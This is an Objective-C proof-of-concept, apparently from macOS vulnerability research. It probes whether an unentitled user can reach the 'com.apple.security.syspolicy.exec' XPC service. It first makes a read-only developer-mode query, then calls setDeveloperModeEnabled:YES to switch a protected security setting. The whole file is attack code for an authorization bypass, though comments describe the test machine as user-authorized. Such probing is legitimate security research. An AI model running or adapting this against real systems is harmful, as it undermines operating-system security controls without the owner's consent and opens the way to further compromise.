#import <Foundation/Foundation.h>
@protocol ExecManager
- (void)isDeveloperModeEnabledWithReply:(void(^)(BOOL enabled))reply;
- (void)setDeveloperModeEnabled:(BOOL)enabled withReply:(void(^)(void))reply;
@end
int main(){ @autoreleasepool {
  NSLog(@"[*] uid=%d euid=%d", getuid(), geteuid());
  NSXPCConnection *c=[[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.security.syspolicy.exec" options:0];
  c.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol:@protocol(ExecManager)];
  __block BOOL inval=NO; c.invalidationHandler=^{ inval=YES; NSLog(@"[!] INVALIDATED (4099 = rejected)"); };
  c.interruptionHandler=^{ NSLog(@"[!] INTERRUPTED (4097 = decode/sig mismatch or teardown)"); };
  [c resume];
  dispatch_semaphore_t s=dispatch_semaphore_create(0);
  id r=[c remoteObjectProxyWithErrorHandler:^(NSError*e){ NSLog(@"[xpc-err] %@", e); dispatch_semaphore_signal(s); }];
  // STEP 1: read-only reachability
  NSLog(@"[1] calling isDeveloperModeEnabledWithReply: (read-only)...");
  [r isDeveloperModeEnabledWithReply:^(BOOL en){ NSLog(@"[1>] REACHABLE — isDeveloperModeEnabled reply: %d (unentitled uid501 accepted)", en); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  if(inval){ NSLog(@"[x] connection rejected — lead refuted"); return 1; }
  // STEP 2: mutating — enable developer mode (user-authorized on this hacking box)
  NSLog(@"[2] calling setDeveloperModeEnabled:YES (mutating, authorized)...");
  [r setDeveloperModeEnabled:YES withReply:^{ NSLog(@"[2>] setDeveloperModeEnabled:YES reply received"); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  sleep(1);
  NSLog(@"[*] done inval=%d", inval);
  return 0;
}}
